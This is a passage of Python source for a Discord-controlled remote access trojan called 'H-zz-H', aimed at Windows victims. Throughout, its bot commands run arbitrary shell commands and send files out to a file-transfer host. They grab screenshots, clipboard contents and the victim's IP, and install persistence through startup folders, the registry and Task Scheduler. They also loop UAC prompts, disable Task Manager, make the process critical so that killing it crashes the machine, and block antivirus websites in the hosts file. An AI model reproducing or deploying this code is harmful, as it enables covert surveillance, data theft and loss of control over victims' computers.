        await ctx.send(embed=embed)

@bot.command()
async def smartup(ctx):
    if is_admin():
        try:
            hzzh_task_scheduler()
            embed = discord.Embed(
                title="✅ Success on SmartUp!",
                description="Succesfully copied into Unknown Startup Path! 🐀" ,
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(
                title="❌ Failed SmartUp!",
                description="Failed to copy into Unknown Path!",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
                title="❌ Failed SmartUp!",
                description="The Script isn't running with Admin! Use !getadmin to get Admin!",
                color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def cmdspam(ctx):
    embed = discord.Embed(
        title="✅ Starting to Spam!",
        description="Succesfully started to spam CMD Windows!",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

    def spam_cmd():
        while True:
            subprocess.Popen("start", shell=True)

    threading.Thread(target=spam_cmd).start()

@bot.command()
async def closesession(ctx):
    current_pid = os.getpid()
    current_process_name = psutil.Process(current_pid).name()

    instances = []

    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == current_process_name and proc.info['pid'] != current_pid:
            instances.append(proc)

    if len(instances) == 0:
        embed = discord.Embed(
            title="✅ No Duplicate Sessions",
            description="No other running sessions of this script were found.",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        return

    current_is_admin = is_admin()

    if current_is_admin:
        closed = []
        for proc in instances:
            try:
                psutil.Process(proc.info['pid']).terminate()
                closed.append(proc.info['pid'])
            except Exception as e:
                print(f"Error closing process {proc.info['pid']}: {e}")

        if closed:
            embed = discord.Embed(
                title="⚠️ Duplicate Sessions Closed",
                description=f"Closed the following duplicate session(s): {closed}",
                color=discord.Color.orange()
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="❌ No Sessions Closed",
                description="No duplicate sessions could be closed.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

    else:
        closed = []
        admin_instance_found = False

        for proc in instances:
            try:
                p = psutil.Process(proc.info['pid'])
                if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                    p.terminate()
                    closed.append(proc.info['pid'])
                else:
                    admin_instance_found = True
            except Exception as e:
                print(f"Error closing process {proc.info['pid']}: {e}")

        if closed:
            embed = discord.Embed(
                title="⚠️ Non-Admin Sessions Closed",
                description=f"Closed the following non-admin session(s): {closed}",
                color=discord.Color.orange()
            )
            await ctx.send(embed=embed)
        elif admin_instance_found:
            embed = discord.Embed(
                title="⚠️ Admin Session Found",
                description="An admin session is running. No non-admin sessions were closed.",
                color=discord.Color.yellow()
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="❌ No Sessions Closed",
                description="No duplicate non-admin sessions were found to close.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

def make_non_critical():
    hProcess = ctypes.windll.kernel32.GetCurrentProcess()
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    return True

def make_critical():
    hProcess = ctypes.windll.kernel32.GetCurrentProcess()
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    return True

@bot.command()
async def uncritproc(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin() != 1:
        embed = discord.Embed(
            title="❌ Admin Privileges Required",
            description="Please run the program with Administrator privileges!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    try:
        if make_non_critical():
            embed = discord.Embed(
                title="✅ Non-Critical Process",
                description="The process has been made non-critical. It can now be safely closed without causing a BSOD.",
                color=discord.Color.green()
            )
        else:
            embed = discord.Embed(
                title="❌ Error",
                description="Failed to mark the process as non-critical.",
                color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"An error occurred: {e}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def critproc(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin() != 1:
        embed = discord.Embed(
            title="❌ Admin Privileges Required",
            description="Please run the program with Administrator privileges!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    try:
        if make_critical():
            embed = discord.Embed(
                title="⚠️ Critical Process",
                description="The process has been made critical. Closing it will cause a BSOD!",
                color=discord.Color.orange()
            )
        else:
            embed = discord.Embed(
                title="❌ Error",
                description="Failed to mark the process as critical.",
                color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"An error occurred: {e}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def nostartup_disable(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if not is_admin:
        embed = discord.Embed(
            title="❗ Admin Privileges Required",
            description="This command requires admin privileges to execute.",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    username = os.getlogin()
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )

    try:
        command = f'icacls "{startup_folder}" /remove:d {username}'
        result = subprocess.run(command, shell=True, capture_output=True)

        if result.returncode == 0:
            embed = discord.Embed(
                title="🔓 Startup Folder Unblocked",
                description=f"Successfully restored access to the Startup folder for user **{username}**.",
                color=0x00FF00
            )
        else:
            embed = discord.Embed(
                title="❗ Error",
                description=f"Failed to unblock the Startup folder:\n```{result.stderr.decode()}```",
                color=0xFF0000
            )

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❗ Error",
            description=f"An error occurred while executing the command:\n```{e}```",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def nostartup(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if not is_admin:
        embed = discord.Embed(
            title="❗ Admin Privileges Required",
            description="This command requires admin privileges to execute.",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    username = os.getlogin()
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )

    try:
        command = f'icacls "{startup_folder}" /deny {username}:F'
        result = subprocess.run(command, shell=True, capture_output=True)

        if result.returncode == 0:
            embed = discord.Embed(
                title="🔒 Startup Folder Blocked",
                description=f"Successfully blocked access to the Startup folder for user **{username}**.",
                color=0xFF0000
            )
        else:
            embed = discord.Embed(
                title="❗ Error",
                description=f"Failed to block the Startup folder:\n```{result.stderr.decode()}```",
                color=0xFF0000
            )

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❗ Error",
            description=f"An error occurred while executing the command:\n```{e}```",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def taskmgr_enable(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        try:
            def check_taskmgr_disabled():
                try:
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    value, _ = reg.QueryValueEx(reg_key, "DisableTaskMgr")
                    reg.CloseKey(reg_key)
                    return value == 1
                except FileNotFoundError:
                    return False
                except OSError:
                    return False

            if check_taskmgr_disabled():
                try:
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0, reg.KEY_SET_VALUE)
                    reg.DeleteValue(reg_key, "DisableTaskMgr")
                    reg.CloseKey(reg_key)

                    embed = discord.Embed(
                        title="🔓 Task Manager Enabled",
                        description="Task Manager has been successfully enabled.",
                        color=0x00FF00
                    )
                    await ctx.send(embed=embed)
                except Exception as e:
                    embed = discord.Embed(
                        title="❗ Error",
                        description=f"An error occurred while enabling Task Manager: {e}",
                        color=0xFF0000
                    )
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="🟢 Task Manager Already Enabled",
                    description="Task Manager is already enabled. No action needed.",
                    color=0x00FF00
                )
                await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                title="❗ Error",
                description=f"An error occurred: {e}",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🔒 Admin Privileges Required",
            description="This command requires admin privileges. Please run the bot as an administrator.",
            color=0xFFA500
        )
        await ctx.send(embed=embed)

@bot.command()
async def taskmgr(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        try:
            global statuuusss
            statuuusss = None

            def check_registry_key():
                try:
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    reg.CloseKey(reg_key)
                    return True
                except FileNotFoundError:
                    return False

            if not check_registry_key():
                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')

            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
            reg.CloseKey(reg_key)

            embed = discord.Embed(
                title="🛠️ Task Manager Disabled",
                description="Successfully disabled the Task Manager.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)

        except Exception as e:
            embed = discord.Embed(
                title="❗ Error",
                description=f"An error occurred while executing the command: {e}",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🔒 Admin Privileges Required",
            description="This command requires admin privileges. Please run the bot as an administrator.",
            color=0xFFA500
        )
        await ctx.send(embed=embed)
@bot.command()
async def blocklist(ctx):
    loop = asyncio.get_event_loop()
    
    def blocklist_task():
        try:
            hostfilepath = os.path.join(os.getenv('systemroot'), os.sep.join(
                subprocess.run(
                    'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',
                    shell=True, capture_output=True
                ).stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]), 'hosts')
            
            with open(hostfilepath) as file:
                data = file.readlines()
        except Exception as e:
            return "Error"

        BANNED_URLs = (
            'virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com',
            'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
            'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com',
            'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com',
            'ccleaner.com', 'comodo.com', 'immunet.com', 'spybot.info', 'superantispyware.com', 'webroot.com', 'secureaplus.com',
            'heimdalsecurity.com', 'herdprotect.com', 'quickheal.com', 'qihoo.com', 'baiduantivirus.com', 'pc-cillin.com',
            'fortinet.com', 'vipre.com', 'ikarussecurity.com', 'f-prot.com', 'gdata.de', 'cybereason.com', 'securemac.com',
            'gridinsoft.com', 'emisoft.com', 'hitmanpro.com', 'sophoshome.com', 'antivirusguide.com', 'arcabit.com',
            'ashampoo.com', 'avgthreatlabs.com', 'bullguard.com', 'bytehero.com', 'checkpoint.com', 'cloudbric.com',
            'cyren.com', 'eScanAV.com', 'filseclab.com', 'fsecure.com', 'k7computing.com', 'nprotect.com',
            'maxsecureantivirus.com', 'avl.com', 'shieldapps.com', 'spywareterminator.com', 'virusbuster.hu', 'zonerantivirus.com',
            'totaldefense.com', 'trustport.com', 'bitdefender.de', 'antiy.com', 'ahnlab.com', 'arcabit.pl', 'baidusecurity.com',
            'netsky.com', 'zillians.net', 'clearsight.com', 'sunbeltsecurity.com', 'plumbytes.com', 'shielden.com',
            'protectorplus.com', 'axantivirus.com', 'rising-global.com'
        )

        newdata = data[:]
        for url in BANNED_URLs:
            entry = f"127.0.0.1 {url}\n"
            if not any([url in line for line in data]):
                newdata.append(entry)

        newdata = ''.join(newdata)

        try:
            subprocess.run(f"attrib -r {hostfilepath}", shell=True, capture_output=True)
            with open(hostfilepath, 'w') as file:
                file.write(newdata)
            subprocess.run(f"attrib +r {hostfilepath}", shell=True, capture_output=True)
        except Exception as e:
            return "Error"

        return "Success"

    result = await loop.run_in_executor(executor, blocklist_task)

    if result == "Success":
        embed = discord.Embed(
            title="🦠 Blocklist",
            description="Successfully blocked access to all common AV sites",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send("An error occurred while updating the blocklist.")

@bot.command()
async def unblocklist(ctx):
    try:
        hostfilepath = os.path.join(
            os.getenv('systemroot'),
            os.sep.join(
                subprocess.run(
                    'REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',
                    shell=True, capture_output=True
                ).stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:]
            ),
            'hosts'
        )
        with open(hostfilepath) as file:
            data = file.readlines()
    except Exception as e:
        await ctx.send(f"Error: {e}")
        return

    BANNED_URLs = (
            'virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com',
            'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com',
            'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com',
            'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com',
            'ccleaner.com', 'comodo.com', 'immunet.com', 'spybot.info', 'superantispyware.com', 'webroot.com', 'secureaplus.com',
            'heimdalsecurity.com', 'herdprotect.com', 'quickheal.com', 'qihoo.com', 'baiduantivirus.com', 'pc-cillin.com',
            'fortinet.com', 'vipre.com', 'ikarussecurity.com', 'f-prot.com', 'gdata.de', 'cybereason.com', 'securemac.com',
            'gridinsoft.com', 'emisoft.com', 'hitmanpro.com', 'sophoshome.com', 'antivirusguide.com', 'arcabit.com',
            'ashampoo.com', 'avgthreatlabs.com', 'bullguard.com', 'bytehero.com', 'checkpoint.com', 'cloudbric.com',
            'cyren.com', 'eScanAV.com', 'filseclab.com', 'fsecure.com', 'k7computing.com', 'nprotect.com',
            'maxsecureantivirus.com', 'avl.com', 'shieldapps.com', 'spywareterminator.com', 'virusbuster.hu', 'zonerantivirus.com',
            'totaldefense.com', 'trustport.com', 'bitdefender.de', 'antiy.com', 'ahnlab.com', 'arcabit.pl', 'baidusecurity.com',
            'netsky.com', 'zillians.net', 'clearsight.com', 'sunbeltsecurity.com', 'plumbytes.com', 'shielden.com',
            'protectorplus.com', 'axantivirus.com', 'rising-global.com'
    )

    newdata = []
    for line in data:
        if not any(url in line and ("127.0.0.1" in line or "::1" in line) for url in BANNED_URLs):
            newdata.append(line)

    newdata = ''.join(newdata).replace('\n\n', '\n')

    try:
        subprocess.run(f"attrib -r {hostfilepath}", shell=True, capture_output=True)
        with open(hostfilepath, 'w') as file:
            file.write(newdata)
        subprocess.run(f"attrib +r {hostfilepath}", shell=True, capture_output=True)

        embed = discord.Embed(
            title="🔓 Unblocklist",
            description="Succesfully unblocked all common AV sites!",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {e}")
        return

@bot.command()
async def getadmin(ctx):
    if is_admin():
        embed = discord.Embed(
            title="Success", 
            description="The user already has admin privileges.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
        return
    else:
        decline_count = 0

        if trigger_uac():
            embed = discord.Embed(
                title="Success", 
                description="The script has been elevated to admin privileges.",
                color=0x00FF00
            )
        else:
            embed = discord.Embed(
                title="Failure", 
                description="UAC was not granted. The operation was canceled or failed.",
                color=0xFF0000
            )
            
            while not trigger_uac():
                decline_count += 1

            embed = discord.Embed(
                title="Success", 
                description=f"The script has been elevated to admin privileges after {decline_count} declined attempts.",
                color=0x00FF00
            )
            
        await ctx.send(embed=embed)
        exit()

@bot.command()
async def floatpic(ctx, seconds: int, image_url: str):
    try:
        await ctx.send(f"Downloading image and displaying for {seconds} seconds...")
        file_path = download_image(image_url)
        threading.Thread(target=create_window, args=(seconds, file_path)).start()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

import subprocess

@bot.command()
async def exec(ctx, path: str):
    try:
        path = path.replace("\\", "\\\\")
        if path.endswith('.exe'):
            subprocess.run(['cmd', '/c', 'start', path], check=True)
            embed = discord.Embed(
                title="✅ File Executed Successfully",
                description=f"Executable file '{path}' has been run.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        
        elif path.endswith(('.png', '.jpg', '.jpeg', '.gif')):
            subprocess.run(['start', path], check=True, shell=True)
            embed = discord.Embed(
                title="✅ File Opened Successfully",
                description=f"Image file '{path}' has been opened.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        
        else:
            embed = discord.Embed(
                title="❌ Unsupported File Type",
                description=f"Cannot execute or open file of type '{path}'.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ File Failed to Run",
            description=f"An error occurred: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)


@bot.command()
async def upload(ctx, path: str = None):
    try:
        if not path:
            path = temp_folder

        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]

            file_path = os.path.join(path, attachment.filename)

            await attachment.save(file_path)

            embed = discord.Embed(
                title="✅ File Downloaded Successfully",
                description=f"File '{attachment.filename}' has been downloaded to '{file_path}'.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ No Attachment Found",
                description="No attachment found in the message. Please attach a file to upload.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"An error occurred: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

current_directory = os.getcwd()
@bot.command()
async def download_ext(ctx, filename: str):
    try:
        file_path = os.path.join(current_directory, filename)

        if os.path.exists(file_path):
            external_api_url = "https://transfer.whalebone.io/"

            with open(file_path, 'rb') as file:
                headers = {
                    "Max-Downloads": "1",  
                    "Max-Days": "5"        
                }
                
                response = requests.put(external_api_url + filename, data=file, headers=headers)

            if response.status_code == 200:
                uploaded_file_url = response.text

                embed = discord.Embed(
                    title="✅ File Uploaded Successfully",
                    description=f"Your file has been uploaded! You can access it here: {uploaded_file_url}",
                    color=0x00FF00
                )
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="❌ Upload Failed",
                    description=f"Failed to upload the file. API Response: {response.text}",
                    color=0xFF0000
                )
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ File Not Found",
                description=f"The file '{filename}' was not found in the current directory.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def purge(ctx, amount: int):
    try:
        await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🚮 Purge",
            description=f"Successfully purged {amount} messages from this channel.",
            color=0x00008B
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def recreate(ctx, channel: discord.TextChannel):
    try:
        await channel.delete()
        await ctx.guild.create_text_channel(channel.name)
        
        embed = discord.Embed(
            title="🔄 Channel Recreated",
            description=f"Channel {channel.name} has been deleted and recreated.",
            color=0x00008B
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def net(ctx):
    try:
        botnet_channel = discord.utils.get(ctx.guild.text_channels, name="botnet")
        
        if botnet_channel:
            await botnet_channel.delete()
            await ctx.guild.create_text_channel("botnet")
            embed = discord.Embed(
                title="⚡ Botnet Recreated",
                description="The Botnet channel has been recreated.",
                color=0x00008B
            )
        else:
            await ctx.guild.create_text_channel("botnet")
            embed = discord.Embed(
                title="⚡ Botnet Created",
                description="The Botnet channel has been created.",
                color=0x00008B
            )

        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def admin(ctx):
    try:
        if is_admin():
            embed = discord.Embed(
                title="🔧 Admin Permissions",
                description="The command is running with admin privileges on the machine! 🛠️",
                color=0x00ff00
            )
        else:
            embed = discord.Embed(
                title="🔧 Admin Permissions",
                description="The command is not running with admin privileges on the machine. ❌",
                color=0xff0000
            )

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def clipboard(ctx):
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            embed = discord.Embed(
                title="📋 Clipboard Content",
                description=f"Here is the content of the clipboard:",
                color=0x00ff00
            )
            embed.add_field(name="Clipboard Content", value=clipboard_content, inline=False)
            await ctx.send(embed=embed)
        else:
            await ctx.send("Clipboard is empty.")

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def wallpaper(ctx):
    try:
        if len(ctx.message.attachments) > 0:  
            attachment = ctx.message.attachments[0]
            image_url = attachment.url
            image_path = os.path.join(temp_folder, "wallpaper.jpg")

            response = requests.get(image_url)
            with open(image_path, 'wb') as f:
                f.write(response.content)

            change_wallpaper_windows(image_path)

            embed = discord.Embed(
                title="🖼️ Wallpaper Change",
                description=f"Wallpaper has been set to: {image_url}",
                color=0x00ff00
            )
            embed.set_image(url=image_url)
            await ctx.send(embed=embed)
        else:
            await ctx.send("No attachment found! Please attach an image for the wallpaper.")

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def publicip(ctx):
    try:
        response = requests.get('https://api.ipify.org?format=json')
        public_address = response.json().get('ip', 'N/A')
        
        embed = discord.Embed(
            title="🌐 Public IP",
            description=f"Victim's Public IP: {public_address} 🌐",
            color=0xff0000
        )
        
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def shutdown(ctx):
    pc_name = get_system_info().get("PC Name", "NoName")
    embed = discord.Embed(
        title="🛑 **Shutting down**",
        description=f"**{pc_name}** is shutting down... Goodbye! 👋",
        color=0xff0000
    )
    await ctx.send(embed=embed)
    
    try:
        if sys.platform.startswith('win'):
            subprocess.run(["shutdown", "/s", "/t", "0"], check=True)
        elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
            subprocess.run(["sudo", "shutdown", "-h", "now"], check=True)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def restart(ctx):
    pc_name = get_system_info().get("PC Name", "NoName")
    embed = discord.Embed(
        title="🔄 **Restarting**",
        description=f"**{pc_name}** is restarting... Please wait! 🔄",
        color=0x0000ff
    )
    await ctx.send(embed=embed)
    
    try:
        if sys.platform.startswith('win'):
            subprocess.run(["shutdown", "/r", "/t", "0"], check=True)  
        elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
            subprocess.run(["sudo", "shutdown", "-r", "now"], check=True)  
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")
@bot.command()
async def command(ctx, *, cmd: str):
    try:
        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        stdout, stderr = process.communicate()

        if process.returncode == 0:
            output = stdout
        else:
            output = stderr

        if len(output) > 2000:
            temp_file_path = os.path.join(temp_folder, "command_output.txt")

            with open(temp_file_path, "w", encoding="utf-8") as f:
                f.write(output)

            await ctx.send(
                content="The output was too long, so it has been saved to a file. You can download it below:",
                file=discord.File(temp_file_path)
            )
        else:
            embed = discord.Embed(
                title="💻 Command Output",
                description=f"Executed command: `{cmd}`",
                color=0x00ff00
            )
            embed.add_field(name="Output", value=output, inline=False)
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Command Error",
            description=f"An error occurred while executing the command: {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def cd(ctx, path: str = None):
    global current_directory

    try:
        if path is None:
            embed = discord.Embed(
                title="📂 Current Directory",
                description=f"The current working directory is: {current_directory}",
                color=0x00ff00
            )
        elif path == "..":
            parent_directory = os.path.dirname(current_directory)
            current_directory = parent_directory
            embed = discord.Embed(
                title="🛠️ CD Command",
                description=f"Moved up one directory to: {current_directory}",
                color=0x00ff00
            )
        else:
            new_path = os.path.join(current_directory, path)

            if os.path.isdir(new_path):
                current_directory = new_path
                embed = discord.Embed(
                    title="🛠️ CD Command",
                    description=f"Successfully changed directory to: {current_directory}",
                    color=0x00ff00
                )
            else:
                embed = discord.Embed(
                    title="❌ CD Command Error",
                    description=f"Directory not found: {path}",
                    color=0xff0000
                )
    except Exception as e:
        embed = discord.Embed(
            title="❌ CD Command Error",
            description=f"An error occurred while changing directory: {str(e)}",
            color=0xff0000
        )

    await ctx.send(embed=embed)

@bot.command()
async def list(ctx):
    global current_directory

    try:
        files = os.listdir(current_directory)

        if not files:
            files = ["No files or directories found."]
        
        items_per_page = 10
        total_files = len(files)
        total_pages = math.ceil(total_files / items_per_page)

        current_page = 1

        def create_embed(page):
            start = (page - 1) * items_per_page
            end = min(start + items_per_page, total_files)
            file_list = files[start:end]

            embed = discord.Embed(
                title="📂 File List",
                description=f"Files in {current_directory} (Page {page}/{total_pages}):",
                color=0x00ff00
            )
            embed.add_field(name="Files", value="\n".join(file_list), inline=False)
            return embed

        embed = create_embed(current_page)
        message = await ctx.send(embed=embed)

        if total_pages > 1:
            await message.add_reaction("⬅️")
            await message.add_reaction("➡️")

        def check(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ["⬅️", "➡️"] and reaction.message.id == message.id

        while True:
            try:
                reaction, user = await bot.wait_for('reaction_add', timeout=10, check=check)

                if str(reaction.emoji) == "➡️" and current_page < total_pages:
                    current_page += 1
                elif str(reaction.emoji) == "⬅️" and current_page > 1:
                    current_page -= 1

                new_embed = create_embed(current_page)
                await message.edit(embed=new_embed)
                await message.remove_reaction(reaction.emoji, user)

            except asyncio.TimeoutError:
                await message.clear_reactions()
                break

    except Exception as e:
        embed = discord.Embed(
            title="❌ List Command Error",
            description=f"An error occurred while listing the files: {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def download(ctx, filename: str):
    global current_directory

    try:
        file_path = os.path.join(current_directory, filename)

        if os.path.exists(file_path) and os.path.isfile(file_path):
            await ctx.send(file=discord.File(file_path))
            embed = discord.Embed(
                title="📤 File Sent",
                description=f"Successfully sent the file: {filename}",
                color=0x00ff00
            )
        else:
            embed = discord.Embed(
                title="❌ File Send Error",
                description=f"File not found: {filename} in {current_directory}",
                color=0xff0000
            )
    except Exception as e:
        embed = discord.Embed(
            title="❌ File Send Error",
            description=f"An error occurred while sending the file: {str(e)}",
            color=0xff0000
        )

    await ctx.send(embed=embed)

@bot.command()
async def startup(ctx):
    hzzh()
    hzzhtemp()
    hzzhreg()
    hzzh_task_scheduler()
    hzzh_runonce()

    embed = discord.Embed(
        title="🐀 StartUp",
        description="The following actions were performed to add H-zz-H to startup:",
        color=0x00ff00
    )

    embed.add_field(name="Shell:Startup", value="Put H-zz-H in shell:startup 🐀", inline=False)
    embed.add_field(name="Temp StartUp", value="Put H-zz-H in Temp StartUp 🐀", inline=False)
    embed.add_field(name="Windows Registry", value="Put H-zz-H in Windows Registry StartUp 🐀", inline=False)
    embed.add_field(name="Task Scheduler", value="Put H-zz-H in Task Scheduler 🐀", inline=False)
    embed.add_field(name="Registry (RunOnce)", value="Put H-zz-H in Windows Registry StartUp 2 🐀", inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def screen(ctx):
    try:
        file_path = os.path.join(temp_folder, "hzzh.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(file_path)

        embed = discord.Embed(
            title="🖼️ Screenshot",
            description="Succesfully took a Screenshot:",
            color=0x00ff00
        )
        
        file = discord.File(file_path, filename="screenshot.png")
        embed.set_image(url="attachment://screenshot.png")
        await ctx.send(embed=embed, file=file)

        os.remove(file_path)

    except Exception as e:
        await ctx.send(f"❌ Fehler beim Erstellen des Screenshots: {e}")

@bot.command()
async def error(ctx, *, message: str):
    try:
        if "|" in message:
            title, msg = message.split("|", 1)
            title = title.strip() 
            msg = msg.strip()  
        else:
            title = "Unknown Error"
            msg = message.strip()

        embed = discord.Embed(
            title=f"⚠️ {title}", 
            description=f"**Message:**\n`{msg}`", 
            color=0xFF0000  
        )

        await ctx.send(embed=embed)

        ctypes.windll.user32.MessageBoxW(0, msg, title, 0x10)

    except Exception as e:
        embed = discord.Embed(
            title="⚠️ Fake Error",
            description="Fake Error failed to display!",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def information(ctx):
    system_info = get_system_info()
    embed = discord.Embed(
        title="🖥️ System Information",
        description=f"**PC Name: 🖥️**\n {system_info['PC Name']}\n"
                    f"**IP Address: 🌐**\n {system_info['IP Address']}\n"
                    f"**Geolocation: 📍**\n {system_info['Geolocation']}\n"
                    f"**System Version: 🖱️**\n {system_info['System Version']}\n"
                    f"**CPU Usage: ⚙️**\n {system_info['CPU Usage']}\n"
                    f"**Memory Usage: 💾**\n {system_info['Memory Usage']}\n"
                    f"**Disk Usage: 🗂️**\n {system_info['Disk Info']}\n\n"
                    "Made with ❤ by H-zz-H.",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

def run_command(command, encoding='utf-8'):
    try:
        subprocess.run("chcp 65001", capture_output=True, shell=True, text=True)
        
        result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding=encoding)
